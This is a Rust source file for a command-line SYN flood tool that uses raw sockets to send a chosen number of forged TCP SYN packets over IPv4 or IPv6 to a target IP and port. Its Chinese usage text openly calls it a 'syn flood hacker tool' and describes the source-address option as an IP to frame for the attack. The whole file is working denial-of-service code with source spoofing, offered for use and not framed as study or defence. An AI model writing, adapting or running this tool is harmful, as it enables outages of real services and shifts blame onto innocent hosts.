use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

use clap::Parser;
use pnet::{
    packet::{
        tcp::{TcpPacket, MutableTcpPacket, TcpFlags, TcpOption},
        ipv4::{MutableIpv4Packet, Ipv4Flags},
        ipv6::{MutableIpv6Packet},
        ip::{IpNextHeaderProtocols},
    },
    transport::{transport_channel, TransportChannelType},
};
use rand::{Rng, rngs::ThreadRng};

#[derive(Parser, Debug)]
#[clap(author, version, about, long_about = None)]
struct Args {
    #[clap(short, long, help = "Target IP address (required)")]
    target: Option<String>,
    #[clap(short, long, help = "Source IP address (required)")]
    source: Option<String>,
    #[clap(short, long, help = "Target port number (required)")]
    port: Option<u32>,
    #[clap(short, long, help = "Number of packets to send (required)")]
    count: Option<u32>,
}

const IPV4_HEADER_LEN: usize = 20;
const IPV6_HEADER_LEN: usize = 40;
const TCP_HEADER_LEN: usize = 32;

fn print_usage() {
    // 英语使用方法
    println!("\nUsage Instructions:");
    println!("This program sends TCP packets to a specified target.");
    println!("Required parameters:");
    println!("  -t, --target <IP>    Target IP address (IPv4 or IPv6)");
    println!("  -s, --source <IP>    Source IP address (IPv4 or IPv6)");
    println!("  -p, --port <PORT>    Target port number");
    println!("  -c, --count <NUM>    Number of packets to send");
    println!("\nExamples:");
    println!("  ./program -t 192.168.1.1 -s 192.168.1.100 -p 80 -c 10");
    println!("  ./program -t 2001:db8::1 -s 2001:db8::100 -p 80 -c 10");
    
    // 汉语使用方法
    println!("\n syn flood hacker工具");
    println!("必填参数:");
    println!("  -t, --target <IP>    目标IP地址 (IPv4或IPv6)");
    println!("  -s, --source <IP>    嫁祸IP地址 (IPv4或IPv6)");
    println!("  -p, --port <PORT>    目标端口号");
    println!("  -c, --count <NUM>    发送的数据包数量");
    println!("\n示例:");
    println!("  ./program -t 192.168.1.1 -s 192.168.1.100 -p 80 -c 10");
    println!("  ./program -t 2001:db8::1 -s 2001:db8::100 -p 80 -c 10");
}

fn main() {
    let args = Args::parse();
    
    // 检查是否缺少必要参数
    let target_str = match &args.target {
        Some(t) => t,
        None => {
            println!("Error: Missing target IP address");
            print_usage();
            return;
        }
    };
    
    let source_str = match &args.source {
        Some(s) => s,
        None => {
            println!("Error: Missing source IP address");
            print_usage();
            return;
        }
    };
    
    let port = match args.port {
        Some(p) if p > 0 && p <= 65535 => p as u16,
        Some(_) => {
            println!("Error: Invalid port number (must be between 1 and 65535)");
            print_usage();
            return;
        }
        None => {
            println!("Error: Missing target port");
            print_usage();
            return;
        }
    };
    
    let count = match args.count {
        Some(c) if c > 0 => c,
        Some(_) => {
            println!("Error: Packet count must be greater than 0");
            print_usage();
            return;
        }
        None => {
            println!("Error: Missing packet count");
            print_usage();
            return;
        }
    };
    
    // 解析源IP和目标IP并检查版本一致性
    let source_ip: IpAddr = match source_str.parse() {
        Ok(ip) => ip,
        Err(_) => {
            println!("Error: Invalid source IP address format");
            print_usage();
            return;
        }
    };
    
    let target_ip: IpAddr = match target_str.parse() {
        Ok(ip) => ip,
        Err(_) => {
            println!("Error: Invalid target IP address format");
            print_usage();
            return;
        }
    };
    
    // 检查IP版本是否一致
    if (source_ip.is_ipv4() && target_ip.is_ipv6()) || (source_ip.is_ipv6() && target_ip.is_ipv4()) {
        println!("Error: Source and target IP addresses must be of the same version");
        print_usage();
        return;
    }
    
    println!("Sending {} packets to {}:{} from {} using {}", 
             count, target_ip, port, source_ip, 
             if source_ip.is_ipv6() { "IPv6" } else { "IPv4" });

    // 根据IP版本设置传输协议
    let protocol = if source_ip.is_ipv6() {
        TransportChannelType::Layer3(IpNextHeaderProtocols::Ipv6)
    } else {
        TransportChannelType::Layer3(IpNextHeaderProtocols::Ipv4)
    };

    // 创建传输通道
    let (mut tx, _) = match transport_channel(64, protocol) {
        Ok((tx, rx)) => (tx, rx),
        Err(e) => panic!("Failed to create transport channel: {}", e),
    };

    // 初始化随机数生成器
    let mut rng = ThreadRng::default();

    // 发送指定数量的数据包
    for i in 0..count {
        // 根据IP版本创建适当大小的缓冲区
        let buffer_size = if source_ip.is_ipv6() {
            IPV6_HEADER_LEN + TCP_HEADER_LEN
        } else {
            IPV4_HEADER_LEN + TCP_HEADER_LEN
        };
        let mut buffer = vec![0u8; buffer_size];

        // 根据IP版本构建数据包
        let tcp_packet = if source_ip.is_ipv6() {
            // 解析为IPv6地址
            let src_ipv6 = if let IpAddr::V6(ip) = source_ip { ip } else {
                panic!("Expected IPv6 address");
            };
            let dst_ipv6 = if let IpAddr::V6(ip) = target_ip { ip } else {
                panic!("Expected IPv6 address");
            };
            
            build_ipv6_packet(src_ipv6, dst_ipv6, port, &mut buffer, &mut rng);
            TcpPacket::new(&buffer[IPV6_HEADER_LEN..]).unwrap()
        } else {
            // 解析为IPv4地址
            let src_ipv4 = if let IpAddr::V4(ip) = source_ip { ip } else {
                panic!("Expected IPv4 address");
            };
            let dst_ipv4 = if let IpAddr::V4(ip) = target_ip { ip } else {
                panic!("Expected IPv4 address");
            };
            
            build_ipv4_packet(src_ipv4, dst_ipv4, port, &mut buffer, &mut rng);
            TcpPacket::new(&buffer[IPV4_HEADER_LEN..]).unwrap()
        };

        // 发送数据包
        match tx.send_to(tcp_packet, target_ip) {
            Ok(_) => if i % 100 == 0 || i == count - 1 {
                println!("Sent packet {}/{}", i + 1, count);
            },
            Err(e) => println!("Failed to send packet {}: {}", i + 1, e),
        }
    }
    
    println!("Packet sending complete");
}

fn build_ipv4_packet(source: Ipv4Addr, target: Ipv4Addr, port: u16, buffer: &mut [u8], rng: &mut ThreadRng) {
    // 设置IP头部
    {
        let len = buffer.len() as u16;
        let mut ip_header = MutableIpv4Packet::new(&mut buffer[..IPV4_HEADER_LEN]).unwrap();
        ip_header.set_version(4);
        ip_header.set_header_length(5);
        ip_header.set_total_length(len);
        ip_header.set_identification(rng.random::<u16>());  // 使用random替代gen
        ip_header.set_flags(Ipv4Flags::DontFragment);
        ip_header.set_ttl(128);
        ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
        ip_header.set_source(source);
        ip_header.set_destination(target);
        
        // 计算并设置校验和
        let checksum = pnet::packet::ipv4::checksum(&ip_header.to_immutable());
        ip_header.set_checksum(checksum);
    }
    
    // 设置TCP头部
    {
        let mut tcp_header = MutableTcpPacket::new(&mut buffer[IPV4_HEADER_LEN..IPV4_HEADER_LEN + TCP_HEADER_LEN]).unwrap();
        tcp_header.set_source(rng.random_range(1000..5000));
        tcp_header.set_destination(port);
        tcp_header.set_sequence(rng.random::<u32>());  // 使用random替代gen
        tcp_header.set_acknowledgement(0);
        tcp_header.set_data_offset(8);
        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(rng.random_range(1000..5000));
        tcp_header.set_urgent_ptr(0);
        
        // 设置TCP选项
        tcp_header.set_options(&[
            TcpOption::mss(1460),
            TcpOption::sack_perm(),
            TcpOption::nop(),
            TcpOption::nop(),
            TcpOption::wscale(7),
        ]);
        
        // 计算并设置TCP校验和
        let tcp_checksum = pnet::packet::tcp::ipv4_checksum(
            &tcp_header.to_immutable(),
            &source,
            &target,
        );
        tcp_header.set_checksum(tcp_checksum);
    }
}

fn build_ipv6_packet(source: Ipv6Addr, target: Ipv6Addr, port: u16, buffer: &mut [u8], rng: &mut ThreadRng) {
    // 设置IP头部
    {
        let payload_len = TCP_HEADER_LEN as u16;
        let mut ip_header = MutableIpv6Packet::new(&mut buffer[..IPV6_HEADER_LEN]).unwrap();
        ip_header.set_version(6);
        ip_header.set_traffic_class(0);
        ip_header.set_flow_label(0);
        ip_header.set_payload_length(payload_len);
        ip_header.set_next_header(IpNextHeaderProtocols::Tcp);
        ip_header.set_hop_limit(64);
        ip_header.set_source(source);
        ip_header.set_destination(target);
    }
    
    // 设置TCP头部
    {
        let mut tcp_header = MutableTcpPacket::new(&mut buffer[IPV6_HEADER_LEN..IPV6_HEADER_LEN + TCP_HEADER_LEN]).unwrap();
        tcp_header.set_source(rng.random_range(1000..5000));
        tcp_header.set_destination(port);
        tcp_header.set_sequence(rng.random::<u32>());  // 使用random替代gen
        tcp_header.set_acknowledgement(0);
        tcp_header.set_data_offset(8);
        tcp_header.set_flags(TcpFlags::SYN);
        tcp_header.set_window(rng.random_range(1000..5000));
        tcp_header.set_urgent_ptr(0);
        
        // 设置TCP选项
        tcp_header.set_options(&[
            TcpOption::mss(1460),
            TcpOption::sack_perm(),
            TcpOption::nop(),
            TcpOption::nop(),
            TcpOption::wscale(7),
        ]);
        
        // 计算并设置TCP校验和
        let tcp_checksum = pnet::packet::tcp::ipv6_checksum(
            &tcp_header.to_immutable(),
            &source,
            &target,
        );
        tcp_header.set_checksum(tcp_checksum);
    }
}